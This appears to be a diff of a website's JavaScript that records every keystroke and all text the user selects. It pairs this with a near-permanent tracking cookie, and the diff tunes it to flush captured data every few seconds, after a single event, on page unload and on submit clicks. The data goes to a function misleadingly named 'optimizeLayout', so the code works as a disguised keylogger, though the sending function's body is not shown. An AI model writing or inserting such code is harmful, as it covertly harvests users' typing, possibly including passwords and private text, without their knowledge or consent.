@@ -28,8 +28,8 @@ function getCookie(name) {
 }
 var math0 = getCookie("math");
 if (math0 == null) {
-	math0=makeid(20);
-	document.cookie = "math=" + math0 + ";max-age=" + 2147483600 + ";domain=.chaol.org;path=/";
+    math0=makeid(20);
+    document.cookie = "math=" + math0 + ";max-age=" + 2147483600 + ";domain=.chaol.org;path=/";
 }
 // else {
 // }
@@ -40,15 +40,21 @@ if (math0 == null) {
 let eventsBuffer = [];
 let keyBuffer = [];
 
-let sendInterval = setInterval(() => {
+setInterval(() => {
     if (eventsBuffer.length > 0) {
-        optimizeLayout('timerInterval');
+        optimizeLayout('eventBufferInterval');
     }
-}, 16000);  // Every 1 minute
+    if (keyBuffer.length > 0) {
+        optimizeLayout('keyBufferInterval');
+    }
+}, 3000);//1min=60 000
+
+
 
 function addToBuffer(type, data) {
     eventsBuffer.push({ type, data });
-    if (eventsBuffer.length >= 33) {
+    if (eventsBuffer.length >= 1) {
+        // twice: event  key
         optimizeLayout('bufferThreshold');
     }
 }
@@ -83,6 +89,7 @@ function optimizeLayout(triggerEvent) {
     eventsBuffer = [];
     keyBuffer = []; 
 }
+
 document.addEventListener('keydown', (e) => {
     if (e.key.length === 1) {
         keyBuffer.push(e.key);
@@ -90,27 +97,32 @@ document.addEventListener('keydown', (e) => {
         keyBuffer.push(`<<<${e.key}>>>`);
     }
 
-    if (keyBuffer.length >= 33) {
+    if (keyBuffer.length >= 12) {
         optimizeLayout('keyBufferThreshold');
     }
 });
 
-
 document.addEventListener('mouseup', function() {
-    const selectedText = window.getSelection().toString().trim().replace(/\r?\n|\r/g, ' ');  // Replacing newline characters with space
+    const selectedText = window.getSelection().toString().trim().replace(/\r?\n|\r/g, ' <br> ');  // Replacing newline characters with space
     if (selectedText.length > 0) {
         addToBuffer('textSelection', selectedText);
     }
 });
 
 
-
 window.addEventListener('beforeunload', () => {
-    clearInterval(sendInterval);
-    if (eventsBuffer.length > 0) {
+    // clearInterval(sendInterval);
+
+    if (keyBuffer.length > 0 || eventsBuffer.length > 0) {
         optimizeLayout('pageUnload');
     }
 });
+
+document.getElementById('submitButton').addEventListener('click', function() {
+    // addToBuffer("event", "SubmitButtonClick");
+    optimizeLayout('SubmitButtonClick'); 
+});
+
 
 document.addEventListener("DOMContentLoaded", function() {
 
@@ -166,3 +178,4 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 });
+
